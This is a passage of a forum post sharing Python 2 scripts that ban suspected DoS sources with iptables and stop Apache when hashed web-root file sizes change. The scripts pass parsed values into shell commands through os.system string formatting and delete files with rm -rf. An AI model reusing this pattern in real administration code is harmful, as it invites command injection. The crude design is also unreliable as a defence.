/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">skip&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">skip&nbsp;is&nbsp;0</span><span style="color: #007700">:&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">deny&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'iptables&nbsp;-I&nbsp;INPUT&nbsp;-s&nbsp;%s&nbsp;-j&nbsp;DROP'&nbsp;</span><span style="color: #007700">%</span><span style="color: #0000BB">text_word&nbsp;</span><span style="color: #FF8000">#&nbsp;it&nbsp;use&nbsp;iptables&nbsp;to&nbsp;ban&nbsp;users<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #0000BB">deny</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">deny&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'iptables&nbsp;-A&nbsp;INPUT&nbsp;&nbsp;-s&nbsp;%s&nbsp;-j&nbsp;DROP'&nbsp;</span><span style="color: #007700">%</span><span style="color: #0000BB">text_word<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #0000BB">deny</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'service&nbsp;iptables-persistent&nbsp;save'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'service&nbsp;iptables-persistent&nbsp;restart'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ipsave&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">open</span><span style="color: #007700">(</span><span style="color: #DD0000">'/root/Banned.txt'</span><span style="color: #007700">,</span><span style="color: #DD0000">'a'</span><span style="color: #007700">)&nbsp;</span><span style="color: #FF8000">#save&nbsp;ip&nbsp;banned&nbsp;for&nbsp;me<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ip_add&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">text_word&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #DD0000">'\n'<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ipsave</span><span style="color: #007700">.</span><span style="color: #0000BB">write</span><span style="color: #007700">(</span><span style="color: #0000BB">ip_add</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ipsave</span><span style="color: #007700">.</span><span style="color: #0000BB">close</span><span style="color: #007700">()&nbsp;&nbsp;<br />&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'rm&nbsp;-rf&nbsp;/root/IPz.txt'</span><span style="color: #007700">)&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>Note: Change exceptions IP to anything you want.<br />
Note: This file find the IPs, which have more threads on server and it going to block them.<br />
Note: You can see block IPs in /root/Banned.txt<br />
Note: This script will check your server every 120 seconds. Why ? Maybe someone trying for DOS/DDOS attack but attack not begin success yet. So it will check and block them too.<br />
<br />
This file will check the MD5 of public_html files and folders, If any file or folder is to be changed/added/removed, Robot will Stop Apache. So you cannot be defaced.<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#md5.py<br />#!/usr/bin/python<br />#By&nbsp;Ali&nbsp;Razmjoo&nbsp;<br />#https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/md5.py<br /></span><span style="color: #0000BB">import&nbsp;os</span><span style="color: #007700">,</span><span style="color: #0000BB">hashlib</span><span style="color: #007700">,</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">,</span><span style="color: #0000BB">signal</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">sys</span><span style="color: #007700">,</span><span style="color: #0000BB">httplib</span><span style="color: #007700">,</span><span style="color: #0000BB">pickle</span><span style="color: #007700">,</span><span style="color: #0000BB">socket</span><span style="color: #007700">,</span><span style="color: #0000BB">re</span><span style="color: #007700">,</span><span style="color: #0000BB">urllib2&nbsp;</span><span style="color: #FF8000">#import&nbsp;modules<br /></span><span style="color: #0000BB">stop_event&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">.</span><span style="color: #0000BB">Event</span><span style="color: #007700">()&nbsp;&nbsp;</span><span style="color: #FF8000">#start&nbsp;multiprocessing<br /></span><span style="color: #0000BB">def&nbsp;stop</span><span style="color: #007700">(</span><span style="color: #0000BB">signum</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">frame</span><span style="color: #007700">):<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">stop_event</span><span style="color: #007700">.</span><span style="color: #0000BB">set</span><span style="color: #007700">()<br /></span><span style="color: #0000BB">signal</span><span style="color: #007700">.</span><span style="color: #0000BB">signal</span><span style="color: #007700">(</span><span style="color: #0000BB">signal</span><span style="color: #007700">.</span><span style="color: #0000BB">SIGTERM</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">stop</span><span style="color: #007700">)<br />if&nbsp;</span><span style="color: #0000BB">__name__&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #DD0000">'__main__'</span><span style="color: #007700">:&nbsp;</span><span style="color: #FF8000">#start&nbsp;software<br />&nbsp;&nbsp;</span><span style="color: #007700">while&nbsp;</span><span style="color: #0000BB">not&nbsp;stop_event</span><span style="color: #007700">.</span><span style="color: #0000BB">is_set</span><span style="color: #007700">():&nbsp;</span><span style="color: #FF8000">#while&nbsp;bash&nbsp;script&nbsp;not&nbsp;stop&nbsp;....<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">time</span><span style="color: #007700">.</span><span style="color: #0000BB">sleep</span><span style="color: #007700">(</span><span style="color: #0000BB">0.6</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'rm&nbsp;-rf&nbsp;/home/size_public_html'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">f&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">open</span><span style="color: #007700">(</span><span style="color: #DD0000">'/home/size_public_html'</span><span style="color: #007700">,</span><span style="color: #DD0000">'a'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;</span><span style="color: #0000BB">dirname</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">dirnames</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">filenames&nbsp;in&nbsp;os</span><span style="color: #007700">.</span><span style="color: #0000BB">walk</span><span style="color: #007700">(</span><span style="color: #DD0000">'/home/z3r0d4y/public_html/'</span><span style="color: #007700">):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">F&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">for&nbsp;</span><span style="color: #0000BB">subdirname&nbsp;in&nbsp;dirnames</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">A&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">path</span><span style="color: #007700">.</span><span style="color: #0000BB">join</span><span style="color: #007700">(</span><span style="color: #0000BB">dirname</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">subdirname</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #DD0000">'error_log'&nbsp;</span><span style="color: #0000BB">in&nbsp;A</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">C&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #DD0000">'access_log'&nbsp;</span><span style="color: #0000BB">in&nbsp;A</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #DD0000">'data'&nbsp;</span><span style="color: #0000BB">in&nbsp;A</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">C&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">C&nbsp;is&nbsp;1</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #DD0000">'public_html/'&nbsp;</span><span style="color: #0000BB">in&nbsp;A</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">size&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">path</span><span style="color: #007700">.</span><span style="color: #0000BB">getsize</span><span style="color: #007700">(</span><span style="color: #0000BB">A</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">wr&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">size</span><span style="color: #007700">)&nbsp;+&nbsp;</span><span style="color: #DD0000">':::'&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">A</span><span style="color: #007700">)&nbsp;+&nbsp;</span><span style="color: #DD0000">'\n'<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">f</span><span style="color: #007700">.</span><span style="color: #0000BB">write</span><span style="color: #007700">(</span><span style="color: #0000BB">wr</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">C&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">for&nbsp;</span><span style="color: #0000BB">filename&nbsp;in&nbsp;filenames</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">F&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">path</span><span style="color: #007700">.</span><span style="color: #0000BB">join</span><span style="color: #007700">(</span><span style="color: #0000BB">dirname</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">filename</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #DD0000">'error_log'&nbsp;</span><span style="color: #0000BB">in&nbsp;F</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">D&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #DD0000">'access_log'&nbsp;</span><span style="color: #0000BB">in&nbsp;F</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">D&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">D&nbsp;is&nbsp;1</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #DD0000">'public_html/'&nbsp;</span><span style="color: #0000BB">in&nbsp;F</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">size&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">path</span><span style="color: #007700">.</span><span style="color: #0000BB">getsize</span><span style="color: #007700">(</span><span style="color: #0000BB">F</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">wr&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">size</span><span style="color: #007700">)&nbsp;+&nbsp;</span><span style="color: #DD0000">':::'&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">F</span><span style="color: #007700">)&nbsp;+&nbsp;</span><span style="color: #DD0000">'\n'<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">f</span><span style="color: #007700">.</span><span style="color: #0000BB">write</span><span style="color: #007700">(</span><span style="color: #0000BB">wr</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">except</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">e&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f</span><span style="color: #007700">.</span><span style="color: #0000BB">close</span><span style="color: #007700">()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">hash&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">open</span><span style="color: #007700">(</span><span style="color: #DD0000">'/home/size_public_html'</span><span style="color: #007700">).</span><span style="color: #0000BB">read</span><span style="color: #007700">()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">md5&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">hashlib</span><span style="color: #007700">.</span><span style="color: #0000BB">md5</span><span style="color: #007700">(</span><span style="color: #0000BB">hash</span><span style="color: #007700">).</span><span style="color: #0000BB">hexdigest</span><span style="color: #007700">()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #0000BB">md5<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'rm&nbsp;-rf&nbsp;/home/size_public_html'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">L&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #DD0000">'9c5302d7c4115dcc4b66da2d5def389c'&nbsp;</span><span style="color: #0000BB">in&nbsp;md5</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">L&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">L&nbsp;is&nbsp;1</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">time</span><span style="color: #007700">.</span><span style="color: #0000BB">sleep</span><span style="color: #007700">(</span><span style="color: #0000BB">0.5</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'service&nbsp;httpd&nbsp;stop'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'echo&nbsp;\'Files&nbsp;Size&nbsp;changed&nbsp;!&nbsp;danger&nbsp;!!!!\'&nbsp;&gt;&nbsp;/home/lamer_detect.txt'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">'\nAll&nbsp;Dead\n'<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'python&nbsp;/root/kill.py'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">sys</span><span style="color: #007700">.exit(</span><span style="color: #0000BB">0</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">'pass&nbsp;,&nbsp;md5:'</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">md5&nbsp;<br /></span>
</span>
</code></code></div>
</div>This file is going to run and ban IPs requested by Robot.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#ban.py<br />#!/usr/bin/python<br />#https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/ban.py&nbsp;<br /></span><span style="color: #0000BB">import&nbsp;os</span><span style="color: #007700">,</span><span style="color: #0000BB">hashlib</span><span style="color: #007700">,</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">,</span><span style="color: #0000BB">signal</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">sys</span><span style="color: #007700">,</span><span style="color: #0000BB">httplib</span><span style="color: #007700">,</span><span style="color: #0000BB">pickle</span><span style="color: #007700">,</span><span style="color: #0000BB">socket</span><span style="color: #007700">,</span><span style="color: #0000BB">re</span><span style="color: #007700">,</span><span style="color: #0000BB">urllib2&nbsp;</span><span style="color: #FF8000">#import&nbsp;modules<br /></span><span style="color: #0000BB">stop_event&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">multiprocessing</span><span style="color: 